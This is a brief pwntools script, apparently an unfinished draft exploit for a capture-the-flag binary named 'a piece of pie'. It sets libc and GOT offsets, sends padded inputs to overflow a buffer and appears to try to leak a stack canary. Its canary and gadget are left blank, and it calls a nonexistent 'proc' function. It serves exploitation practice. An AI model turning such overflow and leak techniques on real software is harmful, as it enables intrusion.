from pwn import *

# port =  23371
# rem = remote("srv1.kitriwhs.kr", port)


rem = proc("./a piece of pie")

puts_offset = 0x80e50
puts_plt = 0x10b0
puts_got = 0x3fa0

# elf = ELF('./WHS/a piece of pie/problem/a_piece_of_pie')
# base_to_gadget = elf.symbols["gadget"]

# libc = ELF('./WHS/a piece of pie/problem/libc.so.6')

payload = b"A" * 0x1
rem.sendafter(b"name: ", payload)
print(rem.recvline())


payload = b"A" * 0xa9
rem.sendafter(b"1: ", payload)
print(rem.recvline())

canary = b""
gadget = b""
payload = b"A"
rem.sendlineafter(b"2: ", payload)
print(rem.recvline())
# print(rem.recvline().hex()[-14 : -2])
# rem.sendlineafter(b"3: ", payload)
